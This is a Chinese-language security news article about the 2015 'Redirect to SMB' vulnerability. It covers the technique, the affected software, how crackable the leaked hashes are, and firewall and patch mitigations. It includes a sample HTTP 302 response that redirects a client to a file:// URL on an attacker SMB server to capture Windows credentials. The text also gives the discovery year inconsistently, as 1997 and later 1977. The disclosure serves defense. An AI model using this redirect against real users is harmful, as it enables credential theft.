SMB重定向攻击

2015-04-14 16:42:28 阅读：19860次 点赞(0) 收藏 来源： 360安全播报

我们发现了一种新型的凭据窃取技术，这项新技术能从Windows PC，平板，服务器甚至是尚未发布的Windows 10操作系统上窃取敏感用户的登录凭据。至少31家企业的软件受到了影响，其中包括Adobe, Apple, Box, Microsoft, Oracle和Symantec。黑客利用这个漏洞就能够破解这些企业发布的软件，我们把这个漏洞叫做“SMB重定向攻击”（Redirect to SMB）。卡内基梅隆大学的计算机安全应急响应组在今天公布了这个漏洞 (#VU672268)，在此之前，应急小组与厂商合作工作了6周终于解决了这个问题。

“SMB重定向攻击”是黑客窃取高价值用户凭据时使用的一种方法；黑客首先发动中间人攻击，劫持用户与合法网页服务器之间的通信，然后黑客把这些凭据发送到恶意的SMB服务器，强制窃取其中的用户名，域名和哈希密码。我们发布了一份白皮书，详细的描述了这个问题，并提供了解决办法，开发者和普通的计算机用户都可以应用这个解决方法。下载《“SMB重定向”白皮书》可以查看更多技术细节。

初始攻击

“SMB重定向攻击”利用了一个漏洞。这个漏洞是Aaron Spangler在1997年发现的；他发现当IE浏览器打开以“file”开头 的URL（如file://1.1.1.1）时，系统就会使用一个IP地址为1.1.1.1的SMB服务器来验证URL。这是一个非常严重的问题，因为一旦凭证泄露，用户的个人账户，数据，PC甚至是网络都会面临被入侵的风险。这些“file”URL可以是图像，iframe，也可以是是其他任何可以被浏览器解析的网页资源。

我们在调查一个聊天客户端的图像预览功能时，发现了“SMB重定向”。这个客户端在接收了一个图像URL时，就会显示图像预览。我们受 Aaron的研究启发，给另一名用户发送了一个以“ file://”开头的URL，这个URL指向了一个恶意的SMB服务器。不出意外，这个聊天客户端会尝试加载图像，并且另一端的Windows用户也会尝试使用我们的SMB服务器验证URL。

我们此前在研究网络协议时，曾经利用把初始HTTP请求重定向到web服务器的方法来识别新的攻击。所以，我们很好奇在重定向SMB会造成什么风险。于是，我们使用Python创建了一个HTTP服务器，这个服务器会使用简单的HTTP 302状态代码，把客户端重定向到一个file:// URL；通过实验，我们证实 http:// URL确实会导致操作系统发起验证。

GET / HTTP/1.1
Accept: text/html, application/xhtml+xml, */*
Accept-Language: en-US
User-Agent: Mozilla/5.0,( Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept-Endoding: gzip, deflate
Host: 192.168.36.207
DNT: 1
Connection: Keep-Alive
 
HTTP/1.1 302 Found
Content-Type: text/html
Location: file://192.168.36.207/mitmproxy-identifier
Content-Length: 0

新增的攻击对象

我们发现了四个常用的Windows API功能会导致HTTP/HTTPS被重定向到SMB。我们此前还发现，大量软件的功能都使用了这几个API功能，比如更新程序和使用报告工具。
这一发现表明，攻击可以通过很多方法实现。如果黑客再结合使用中间人攻击，就能强制系统使用SMB服务器验证可疑的应用和服务，如HTTP或HTTPS数据传输服务。

受影响的应用程序

我们在实验室中测试了大量的应用，结果发现31个软件包中存在着漏洞，我们在2015年2月27日把这些结果告诉了卡耐基梅隆大学的计算机安全应急组。受影响的应用包括：

常用程序：

Adobe Reader, Apple QuickTime and Apple Software Update (处理iTunes的更新)

微软：

Internet Explorer, Windows Media Player, Excel 2010, Microsoft Baseline Security Analyzer

杀毒软件：

Symantec’s Norton Security Scan, AVG Free, BitDefender Free, Comodo Antivirus

安全工具：

.NET Reflector, Maltego CE

Team Tools：

Box Sync, TeamViewer

开发者工具：

Windows版Github , PyCharm, IntelliJ IDEA, PHP Storm, JDK 8u31的安装程序

影响

只有高级黑客才会在针对性攻击中使用“SMB重定向”，因为黑客必须控制受害人的网络流量。

恶意广告经过修改也能强制IE用户执行验证，同时在显示广告时还能隐藏恶意行为。

水平较低的黑客可以使用“SMB重定向”攻击公共的WiFi访问点，例如在咖啡厅中上网的计算机，移动设备等。我们使用Nexus 7在家用网络环境中，就成功使用工具实现了这种入侵方法。

加密凭据

虽然通过SMB传输的用户凭据都是加密的，但是加密方法确是1998年的，用当今的标准来看，这种加密方法实在是太弱了。如果使用更强大的哈希算法来加密这些凭据就能有效的削弱攻击威胁，但是最有效的方法还是禁用不受信SMB服务器的自动认证。黑客利用价值3000美元的GPU，只要半天就能破解任何8位密码，区分字母大小写和数字的密码也没问题。

解决办法

Microsoft刚刚发布了一个补丁来修复“SMB重定向”补丁。最简单的办法是来接TCP139和TCP445发出的流量-可以在终端防火墙上拦截也可以在网关防火墙上拦截（如果你是用的是可信网络）。终端防火墙会拦截所有的SMB通信，这样可能同时会禁用一些其他依赖SMB的功能。如果是在网关防火墙上禁用，SMB功能仍然能在内部网络中使用，但是外部认证则无法进行。白皮书中说明了其他的解决过程。

Microsoft还是没有解决Aaron Spangler 在1977年发现的问题。我们希望我们的研究能够让Microsoft重视这个漏洞，禁用不可信SMB服务器的认证操作。这样就能解决Spangler发现的攻击方法，同时也能拦截“SMB重定向”。
